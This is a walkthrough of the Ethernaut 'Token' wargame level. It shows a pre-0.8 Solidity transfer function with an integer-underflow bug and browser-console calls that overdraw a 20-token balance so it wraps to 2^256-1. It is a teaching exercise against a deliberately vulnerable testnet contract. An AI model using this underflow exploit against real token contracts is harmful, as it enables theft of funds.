---
title: "Token – Level 5 Walkthrough"
summary: "Step-by-step walkthrough for the Token Ethernaut level. Learn to exploit integer underflow in ERC20-like smart contracts and gain unlimited tokens."
date: "Jun 28 2025"
tags:
- Ethereum
- Smart Contracts
- Security
- Ethernaut
- Walkthrough
---

# Token – Level 5 Walkthrough

Welcome to the **Token** level of the [**Ethernaut**](https://ethernaut.openzeppelin.com/) wargame by OpenZeppelin, focused on exploiting **integer underflows** in smart contracts.

---

## Challenge Objective

You are given an ERC20-like token contract where:

- You start with **20 tokens**
- Your goal is to:
    - Exploit the contract to **get more than 20 tokens**
    - Submit the instance to complete the level

---

## Prerequisites

Ensure you have:

- MetaMask installed and connected
- Some test ETH (e.g., on Sepolia or Goerli)
- Console access on the Ethernaut page
- Understanding of basic ERC20 and Solidity underflow vulnerabilities

---

## Getting Started

### 1. Load the Level

- Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
- Select **“Token”**
- Click **"Get new instance"**
- Confirm transaction in MetaMask

Once deployed, a `contract` object becomes available in the browser DevTools console.

---

## Vulnerability Background

The contract looks something like this:

```solidity
mapping(address => uint) balances;

function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
}
```

The key issue:  
Before Solidity 0.8.0, arithmetic underflows would **wrap around** silently instead of throwing errors. So if you have 20 tokens and try to transfer **21**, your balance becomes:

```
balances[msg.sender] = 20 - 21 = uint256(-1) = 2^256 - 1
```

This gives you **a huge number of tokens**.

---

## Walkthrough – Step by Step

### Step 1: Check Your Balance

```js
await contract.balanceOf(player)
// should return: BigNumber { _hex: '0x14', ... } → 20 tokens
```

---

### Step 2: Transfer More Than You Own

```js
await contract.transfer('0x0000000000000000000000000000000000000000', 21)
```

You don’t need the address to be special — we just need the math to trigger.

> 💥 This will cause an **underflow**, giving your account `2^256 - 1` tokens.

---

### Step 3: Check Your New Balance

```js
(await contract.balanceOf(player)).toString()
// should return something like: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
```

Now you have **more than enough tokens**.

---

### Step 4: Submit the Level

Click **"Submit instance"** on the Ethernaut UI and confirm in MetaMask.

🎉 Level Complete!

---

## What You Learn

- How integer underflows were a critical vulnerability in pre-0.8 Solidity
- Importance of safe math operations or compiler safeguards
- ERC20 basics and smart contract accounting

---

## Concepts Covered

| Concept                 | Description                                                                |
| ----------------------- | -------------------------------------------------------------------------- |
| Integer underflow       | When subtracting a larger number from a smaller one wraps the number space |
| ERC20 token standard    | Basic mechanics of token balances and transfers                            |
| Secure math in Solidity | Use of `SafeMath` library or built-in checks in Solidity >= 0.8            |

---

## Resources

- [Ethernaut](https://ethernaut.openzeppelin.com/)
- [Solidity Docs – Arithmetic Safety](https://docs.soliditylang.org/en/latest/080-breaking-changes.html#unchecked)
- [OpenZeppelin Contracts – SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)
